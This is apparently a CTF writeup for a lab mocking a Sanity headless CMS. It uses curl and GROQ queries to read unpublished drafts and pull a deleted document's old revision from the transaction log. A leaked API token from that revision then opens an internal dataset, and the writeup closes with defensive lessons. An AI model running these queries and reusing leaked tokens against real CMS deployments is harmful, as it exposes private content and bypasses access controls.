---
layout: post
title: "Mythos Leak - Headless CMS Draft Exposure"
description: "CTF writeup exploiting a Sanity headless CMS mock: retrieving unpublished draft posts via GROQ, mining the document transaction log for a deleted briefing, recovering its historical revision with an embedded API token, and using the token to access a separate internal dataset that leaks a launch briefing containing the root flag."
category: hackerdna
tags: [web, ctf, hackerdna, sanity, headless-cms, groq, draft-exposure, api-token, web]
---

## Mythos Leak - Headless CMS Draft Exposure - CTF Writeup

**Category:** WEB | **Flags:** 2 (User / Root)

Challenge: [https://hackerdna.com/labs/mythos-leak-headless-cms](https://hackerdna.com/labs/mythos-leak-headless-cms)

## Contents

- [Reconnaissance](#reconnaissance)
- [Draft Exposure via the Sanity Mock](#draft-exposure-via-the-sanity-mock)
- [The Deleted Briefing: Transaction Log](#the-deleted-briefing-transaction-log)
- [Recovering a Historic Revision](#recovering-a-historic-revision)
- [Internal Dataset: Root Flag](#internal-dataset-root-flag)

## Reconnaissance

The target serves **Philanthropic Research**'s marketing site - a Next.js-style
frontend whose content comes from a headless CMS (Sanity). The homepage
(`/`) is mostly static HTML, but it embeds a webpack chunk
`/_next/static/chunks/pages/_app-7b2e9c.js` containing a Sanity client:

```js
createClient({
  projectId: "mk9v4t2x",
  dataset: "production",
  apiVersion: "2021-10-21",
  useCdn: true,
  perspective: "published",
})
```

It issues a GROQ query `*[_type=="post"]|order(_createdAt desc)`. Good we
read the JS: Sanity's public API won't have this project, but the lab simulates
the API locally under `/mk9v4t2x.api.sanity.io/`.

## Draft Exposure via the Sanity Mock

The mock Sanity endpoint answers real GROQ queries:

```bash
curl "http://TARGET/mk9v4t2x.api.sanity.io/v2021-10-21/data/query/production?query=*[_type=='post']"
```

The published posts are innocent. But the CMS also had **unpublished drafts**,
which the client never shows. Query drafts directly via GROQ's `path()`
helper:

```bash
curl "http://TARGET/mk9v4t2x.api.sanity.io/v2021-10-21/data/query/production?query=*[_id in path('drafts.**')]"
```

A draft post (`drafts.featurePhilanthropic`) contains:

```
EMBARGOED DRAFT. Do not publish.
...
>>> USER FLAG: c1709390-d69f-42d1-b0cf-8e962f5281ef <<<

See the internal briefing document (_id: drafts.internalBriefing) for the
launch comms plan. It was pulled before launch, but the transaction log
still lists its old revisions.
```

Good hint: the briefing was **deleted**, but its old revisions remain in the
transaction log.

## The Deleted Briefing: Transaction Log

Query the transaction log for the deleted document:

```bash
curl "http://TARGET/mk9v4t2x.api.sanity.io/v2021-10-21/data/history/production/transactions/drafts.internalBriefing"
```

Returns NDJSON:

```text
{"id":"txn-a10e8844","timestamp":"2026-02-20T09:00:00Z","documentIDs":["drafts.internalBriefing"],
 "mutations":[{"create":{"_id":"drafts.internalBriefing"}}],"revision":"rev-121b279bc8fd"}
{"id":"txn-c73b2219","timestamp":"2026-03-05T11:00:00Z","documentIDs":["drafts.internalBriefing"],
 "mutations":[{"delete":{"id":"drafts.internalBriefing"}}],"revision":"rev-deleted"}
```

## Recovering a Historic Revision

The document was created at revision `rev-121b279bc8fd` and then deleted.
Sanity's history endpoint serves a snapshot of a document at any revision via
`?revision=`:

```bash
curl "http://TARGET/mk9v4t2x.api.sanity.io/v2021-10-21/data/history/production/documents/drafts.internalBriefing?revision=rev-121b279bc8fd"
```

The briefing's body is redacted, but its author metadata leaks a leaked
**API token**:

```json
"author": {
  "name": "Security Review",
  "notes": "... API token for the internal dataset:
           skNFoYVeza7gNTSTlS_Ma55Phzzl6ooMNSYXPpR8gmdZY"
}
```

## Internal Dataset: Root Flag

There is a **second, internal dataset** guarded by that token. Send it as
`Authorization: Bearer`:

```bash
curl -H "Authorization: Bearer skNFoYVeza7gNTSTlS_Ma55Phzzl6ooMNSYXPpR8gmdZY" \
  "http://TARGET/mk9v4t2x.api.sanity.io/v2021-10-21/data/query/internal?query=*"
```

```json
{
  "_id": "briefing-philanthropic",
  "_type": "briefing",
  "title": "Philanthropic Internal Launch Briefing",
  "body": "Cleared for internal distribution only.\n...
>>> ROOT FLAG: b526113a-399f-42b3-9e2f-43c376430d1b <<<
"
}
```

**Root Flag:** `b526113a-399f-42b3-9e2f-43c376430d1b`

## How the Attack Works

1. **Draft exposure** - the CMS exposes unpublished (draft) documents through
   the public query API; the frontend simply filters them out with
   `perspective: "published"`, which is not access control.
2. **Transaction log archaeology** - deleted documents leave their entire
   revision history in the log; `?revision=` pulls pre-deletion snapshots.
3. **Leaked token** - the historical revision contains a valid API token in
   doc metadata.
4. **Dataset escalation** - the token unlocks a parallel internal dataset
   whose documents were never meant for the public marketing frontend.

## Key Takeaways

- **Headless CMS drafts are still "content"** - if the query API doesn't treat
  drafts as secret, they're public. `perspective`/`draft` filtering is
  presentation, not authorization.
- **Deleted != destroyed.** Always check history/transaction APIs for documents
  that were "removed" - they often reveal flags or credentials.
- **Read the JS bundle.** The whole CMS config (project ID, dataset, API
  version, client behavior) came from a single shipped webpack chunk.
- **Separate datasets need separate trust.** The internal dataset relied only on
  a token that was lying in a historical revision, not on real per-dataset
  authorization.